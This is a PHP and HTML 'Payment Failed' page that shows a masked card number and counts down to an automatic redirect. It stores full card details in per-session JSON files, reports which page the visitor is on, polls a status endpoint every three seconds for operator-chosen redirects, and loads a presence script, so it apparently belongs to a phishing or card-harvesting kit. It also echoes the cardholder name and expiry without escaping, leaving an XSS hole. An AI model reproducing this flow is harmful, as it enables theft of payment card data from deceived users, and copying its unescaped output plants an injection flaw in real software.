<?php
require_once 'config.php';

// Get session ID from URL
$sessionId = $_GET['session'] ?? '';
if (!preg_match('/^[a-f0-9]{32}$/', $sessionId)) {
    die('Invalid session ID');
}

$sessionFile = SESSIONS_DIR . '/' . $sessionId . '.json';
if (!file_exists($sessionFile)) {
    die('Session not found');
}

// Read session data
$sessionData = json_decode(file_get_contents($sessionFile), true);

$pageTitle = 'Payment Failed';
$checkStatusUrl = buildPageUrl('check_status');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Failed</title>
    <style>
        :root {
            --error: #dc3545;
            --text: #32325d;
            --text-light: #6b7c93;
            --bg: #f8f9fa;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            -webkit-font-smoothing: antialiased;
        }
        
        .failed-container {
            max-width: 500px;
            width: 100%;
            padding: 20px;
            text-align: center;
        }
        
        .failed-icon {
            font-size: 80px;
            color: var(--error);
            margin-bottom: 20px;
            animation: shake 0.5s ease-in-out;
        }
        
        .failed-title {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 15px;
            color: var(--error);
        }
        
        .failed-message {
            font-size: 16px;
            color: var(--text-light);
            margin-bottom: 30px;
            line-height: 1.5;
        }
        
        .card-preview {
            background: white;
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            border: 1px solid #dee2e6;
        }
        
        .card-number {
            font-size: 18px;
            font-weight: 500;
            letter-spacing: 2px;
            margin-bottom: 15px;
            color: var(--text);
        }
        
        .card-details {
            display: flex;
            justify-content: space-between;
            font-size: 14px;
            color: var(--text-light);
        }
        
        .help-section {
            background: rgba(220, 53, 69, 0.1);
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            text-align: left;
        }
        
        .help-section h3 {
            margin-bottom: 10px;
            color: var(--error);
        }
        
        .help-section ul {
            padding-left: 20px;
        }
        
        .help-section li {
            margin-bottom: 5px;
        }
        
        .home-btn {
            display: inline-block;
            padding: 12px 30px;
            background: var(--error);
            color: white;
            text-decoration: none;
            border-radius: 6px;
            font-weight: 500;
            transition: background-color 0.15s ease;
        }
        
        .home-btn:hover {
            background: #c82333;
        }
        
        .redirect-timer {
            background: rgba(220, 53, 69, 0.1);
            border: 2px solid var(--error);
            border-radius: 12px;
            padding: 20px;
            margin: 30px 0;
            text-align: center;
        }
        
        .timer-text {
            font-size: 18px;
            font-weight: 600;
            color: var(--error);
            margin-bottom: 10px;
        }
        
        .timer-countdown {
            font-size: 36px;
            font-weight: 700;
            color: var(--error);
            margin: 10px 0;
        }
        
        .redirect-message {
            font-size: 14px;
            color: var(--text-light);
            margin-top: 10px;
        }
        
        @keyframes shake {
            0%, 100% {transform: translateX(0);}
            10%, 30%, 50%, 70%, 90% {transform: translateX(-10px);}
            20%, 40%, 60%, 80% {transform: translateX(10px);}
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        .timer-countdown {
            animation: pulse 1s ease-in-out infinite;
        }
        
        @media (max-width: 480px) {
            .failed-container {
                padding: 15px;
            }
            
            .failed-icon {
                font-size: 60px;
            }
            
            .failed-title {
                font-size: 24px;
            }
        }

        body {
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        body.page-loaded {
            opacity: 1;
        }

        body.page-leave {
            opacity: 0;
        }
    </style>
</head>
<body>
    <div class="failed-container">
        <div class="failed-icon">❌</div>
        <h1 class="failed-title">Payment Failed</h1>
        <p class="failed-message">
            Unfortunately, your payment could not be processed. Please try again or use a different payment method.
        </p>
        
        <div class="card-preview">
            <div class="card-number">
                **** **** **** <?= substr($sessionData['card_data']['number'], -4) ?>
            </div>
            <div class="card-details">
                <span><?= $sessionData['card_data']['holder'] ?></span>
                <span><?= $sessionData['card_data']['expiry'] ?></span>
            </div>
        </div>
        
        <div class="help-section">
            <h3>What can you do?</h3>
            <ul>
                <li>Check your card details and try again</li>
                <li>Ensure you have sufficient funds</li>
                <li>Contact your bank if the problem persists</li>
                <li>Try using a different payment method</li>
            </ul>
        </div>
        
        <div class="redirect-timer">
            <div class="timer-text">Redirecting in</div>
            <div class="timer-countdown" id="countdown">5</div>
            <div class="redirect-message">You will be redirected automatically</div>
        </div>
        
        <a href="<?= htmlspecialchars(buildPageUrl('payments')) ?>" class="home-btn">Try Again</a>
    </div>
    
    <script>
        let countdown = 5;
        const countdownElement = document.getElementById('countdown');
        const redirectUrl = <?= json_encode(getRedirectUrl($sessionData)) ?>;
        
        const timer = setInterval(function() {
            countdown--;
            countdownElement.textContent = countdown;
            
            if (countdown <= 0) {
                clearInterval(timer);
                window.location.href = redirectUrl;
            }
        }, 1000);
    </script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.body.classList.add('page-loaded');
            const sessionId = <?= json_encode($sessionId) ?>;
            const pageTitle = <?= json_encode($pageTitle) ?>;

            const checkStatusUrl = <?= json_encode($checkStatusUrl) ?>;
            const poll = () => {
                fetch(`${checkStatusUrl}?session=${encodeURIComponent(sessionId)}&page=${encodeURIComponent(pageTitle)}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.redirect) {
                            window.location.href = data.redirect;
                        }
                    })
                    .catch(() => {});
            };

            poll();
            setInterval(poll, 3000);

            document.querySelectorAll('a[href]').forEach(link => {
                link.addEventListener('click', () => document.body.classList.add('page-leave'));
            });
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', () => document.body.classList.add('page-leave'));
            });
        });
    </script>
    <?php require_once 'presence_client.php'; ?>
</body>
</html>
